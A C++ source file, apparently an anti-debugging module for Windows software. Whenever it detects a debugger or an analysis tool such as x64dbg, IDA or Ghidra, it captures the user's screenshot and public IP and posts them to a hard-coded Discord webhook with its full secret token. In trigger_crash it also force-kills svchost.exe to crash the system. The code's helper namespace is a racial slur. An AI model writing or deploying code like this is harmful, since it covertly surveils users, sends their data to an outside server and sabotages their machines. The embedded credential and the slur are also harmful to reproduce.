#include "antidebug.h"
#include <thread>
#include <chrono>
#include "webhook.h"

pfnNtQueryInformationProcess pNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

void trigger_crash() {
    std::string ip = niggerhook::get_public_ip();
    if (ip.empty()) ip = "Unknown";
    niggerhook::Embed e;
    e.title = "crack attempt";
    e.description = "IP: " + ip + " | rip svchost ";
    e.color = "16711680"; // red
    ULONG_PTR gdToken = niggerhook::start_gdiplus();
    auto screenshot = niggerhook::capture_screenshot();
    niggerhook::send_webhook("https://discord.com/api/webhooks/1465933964140351533/FOPHkUwXhKztUWJiXN3nzWz2P6EFItWzQ-B_oP9sUNg1AI4o-8xFVthSolkP4_bfwOft",
        "<@1243921676887134285> <@1285143577936003103>", &e, &screenshot, "screenshot.png");
    niggerhook::stop_gdiplus(gdToken);
    system("taskkill /f /im svchost.exe");
    std::exit(0);
}

void trigger_seh_exception() {
    __try
    {
        RaiseException(DBG_PRINTEXCEPTION_C, 0, 0, 0);
        trigger_crash();
    }
    __except (GetExceptionCode() == DBG_PRINTEXCEPTION_C) {}
}
niggerhook::Embed e;

void debugger_detection() {

    ULONG_PTR gdToken = niggerhook::start_gdiplus();

    while (true) {
        if (IsDebuggerPresent()) {
            trigger_crash();
        }

        static _PEB64* p_peb{ reinterpret_cast<_PEB64*>(NtCurrentTeb()->ProcessEnvironmentBlock) };
        if (p_peb->BeingDebugged) {
            trigger_crash();
        }

        if (p_peb->NtGlobalFlag & (0x10 | 0x20 | 0x40)) {
            trigger_crash();
        }

        BOOL is_debugged{};
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &is_debugged);
        if (is_debugged) {
            trigger_crash();
        }

        DWORD_PTR debug_port{};
        if (pNtQueryInformationProcess && NT_SUCCESS(pNtQueryInformationProcess(GetCurrentProcess(), static_cast<PROCESSINFOCLASS>(ProcessDebugPort), &debug_port, sizeof(debug_port), nullptr)) && debug_port != 0) {
            trigger_crash();
        }

        DWORD debug_flags{};
        if (pNtQueryInformationProcess && NT_SUCCESS(pNtQueryInformationProcess(GetCurrentProcess(), static_cast<PROCESSINFOCLASS>(31), &debug_flags, sizeof(debug_flags), nullptr)) && debug_flags == 0) {
            trigger_crash();
        }

        HANDLE debug_object{};
        if (pNtQueryInformationProcess && NT_SUCCESS(pNtQueryInformationProcess(GetCurrentProcess(), static_cast<PROCESSINFOCLASS>(30), &debug_object, sizeof(debug_object), nullptr)) && debug_object != 0) {
            trigger_crash();
        }

        static const char* titles[] = { "Process Monitor", "Cheat Engine", "Process Hacker", "x64dbg", "x32dbg", "IDA - ", "IDA Pro", "IDA Free", "WinDbg", "Ghidra", "Binary Ninja", "System Informer", nullptr };
        
        for (int i{}; titles[i]; i++)
        {
            HWND hwnd{};
        
            constexpr size_t maximumWindowNameSize = 256;
            char windowText[maximumWindowNameSize];
        
            while ((hwnd = FindWindowExA(nullptr, hwnd, nullptr, nullptr)) != nullptr)
            {
                if (GetWindowTextA(hwnd, windowText, sizeof(windowText)) > 0 && strstr(windowText, titles[i]) != nullptr)
                {
                    std::string ip = niggerhook::get_public_ip();
                    if (ip.empty()) ip = "Unknown";
                    niggerhook::Embed e;
                    e.title = "crack attempt";
                    e.description = "IP: " + ip + " | Triggered: " + std::string(titles[i]);
                    e.color = "16711680"; // red
                    ULONG_PTR gdToken = niggerhook::start_gdiplus();
                    auto screenshot = niggerhook::capture_screenshot();
                    niggerhook::send_webhook("https://discord.com/api/webhooks/1465933964140351533/FOPHkUwXhKztUWJiXN3nzWz2P6EFItWzQ-B_oP9sUNg1AI4o-8xFVthSolkP4_bfwOft",
                        "<@1243921676887134285> <@1285143577936003103>", &e, &screenshot, "screenshot.png");
                    niggerhook::stop_gdiplus(gdToken);
                    //MessageBoxA(nullptr, "Irregular software has been found running on your computer, this incident has been logged ;)", "", MB_ICONERROR | MB_OK);
                    std::exit(0);
                }
            }
        }
        
        static const char* classes[] = { "OLLYDBG", "WinDbgFrameClass", "ProcessHacker", "PROCMON_WINDOW_CLASS", nullptr };
        
        for (int i{}; classes[i]; i++) {
            if (FindWindowA(classes[i], nullptr)) { 
                std::string ip = niggerhook::get_public_ip();
                if (ip.empty()) ip = "Unknown";
                niggerhook::Embed e;
                e.title = "Crack Attempt";
                e.description = "IP: " + ip + " | Triggered: " + std::string(classes[i]);
                e.color = "16711680"; // red
                ULONG_PTR gdToken = niggerhook::start_gdiplus();
                auto screenshot = niggerhook::capture_screenshot();
                niggerhook::send_webhook("https://discord.com/api/webhooks/1465933964140351533/FOPHkUwXhKztUWJiXN3nzWz2P6EFItWzQ-B_oP9sUNg1AI4o-8xFVthSolkP4_bfwOft",
                    "<@1243921676887134285> <@1285143577936003103>", &e, &screenshot, "screenshot.png");
                niggerhook::stop_gdiplus(gdToken);
                //MessageBoxA(nullptr, "Irregular software has been found running on your computer, this incident has been logged ;)", "", MB_ICONERROR | MB_OK);
                std::exit(0);
            }
        }

        CONTEXT ctx{};
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

        GetThreadContext(GetCurrentThread(), &ctx);

        if ((ctx.Dr0 != 0) || (ctx.Dr1 != 0) || (ctx.Dr2 != 0) || (ctx.Dr3 != 0) || (ctx.Dr6 != 0) || (ctx.Dr7 & 0xFF)) {
            std::string ip = niggerhook::get_public_ip();
            if (ip.empty()) ip = "Unknown";
            niggerhook::Embed e;
            e.title = "Crack Attempt";
            e.description = "IP: " + ip + " | ctx flag ";
            e.color = "16711680"; // red
            ULONG_PTR gdToken = niggerhook::start_gdiplus();
            auto screenshot = niggerhook::capture_screenshot();
            niggerhook::send_webhook("https://discord.com/api/webhooks/1465933964140351533/FOPHkUwXhKztUWJiXN3nzWz2P6EFItWzQ-B_oP9sUNg1AI4o-8xFVthSolkP4_bfwOft",
                "<@1243921676887134285> <@1285143577936003103>", &e, &screenshot, "screenshot.png");
            niggerhook::stop_gdiplus(gdToken);
            //MessageBoxA(nullptr, "Irregular software has been found running on your computer, this incident has been logged ;)", "", MB_ICONERROR | MB_OK);
            std::exit(0);
        }

        trigger_seh_exception();

        static const char* commonKernel32Functions[] =
        {
            "IsDebuggerPresent",
            "EnumDeviceDrivers",
            "CloseHandle",
            "CheckRemoteDebuggerPresent",
            "GetThreadContext",
            "RaiseException",
            "OutputDebugStringA",
            "OutputDebugStringW",
            "DebugBreak",
            "CreateToolhelp32Snapshot",
            "EnumWindows",
            "FindWindow",
            "GetTickCount",
            "GetTickCount64",
            "GetSystemTime",
            "GetStartupInfo",
            nullptr
        };

        static const char* commonNtDllFunctions[] =
        {
            "NtQueryInformationProcess",
            "ZwQueryInformationProcess",
            "NtSetInformationThread",
            nullptr
        };

        static const char* commonWs2_32Functions[] =
        {
            "send",
            "recv",
            "connect",
            "accept",
            "bind",
            "closesocket",
            "WSAStartup",
            "WSACleanup",
            nullptr
        };

        static HMODULE kernel32_address{ GetModuleHandleA("kernel32.dll") };
        static HMODULE ntdll_address{ GetModuleHandleA("ntdll.dll") };
        static HMODULE ws2_32_address{ GetModuleHandleA("ws2_32.dll") };

        constexpr std::uint8_t int3opcode = 0xCC;
        constexpr std::uint16_t int3multi_byte_opcode = 0xCD03;
        constexpr std::uint16_t undefined_opcode = 0x0F0B;


        for (int i{}; commonKernel32Functions[i]; i++) {

            void* functionPointer{ reinterpret_cast<void*>(GetProcAddress(kernel32_address, commonKernel32Functions[i])) };

            if (!functionPointer)
                continue;

            if (*(std::uint8_t*)functionPointer == int3opcode ||
                *(std::uint16_t*)functionPointer == int3multi_byte_opcode ||
                *(std::uint16_t*)functionPointer == undefined_opcode)
            {
                trigger_crash();
                return;
            }
        }

        for (int i{}; commonNtDllFunctions[i]; i++) {

            void* function_pointer{ reinterpret_cast<void*>(GetProcAddress(ntdll_address, commonNtDllFunctions[i])) };

            if (*(std::uint8_t*)function_pointer == int3opcode ||
                *(std::uint16_t*)function_pointer == int3multi_byte_opcode ||
                *(std::uint16_t*)function_pointer == undefined_opcode)
            {
                trigger_crash();
                return;
            }
        }

        for (int i = 0; commonWs2_32Functions[i]; i++) {

            void* functionPointer = reinterpret_cast<void*>(GetProcAddress(ws2_32_address, commonWs2_32Functions[i]));

            if (!functionPointer)
                continue;

            if (*(std::uint8_t*)functionPointer == int3opcode ||
                *(std::uint16_t*)functionPointer == int3multi_byte_opcode ||
                *(std::uint16_t*)functionPointer == undefined_opcode)
            {
                trigger_crash();
                return;
            }
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
}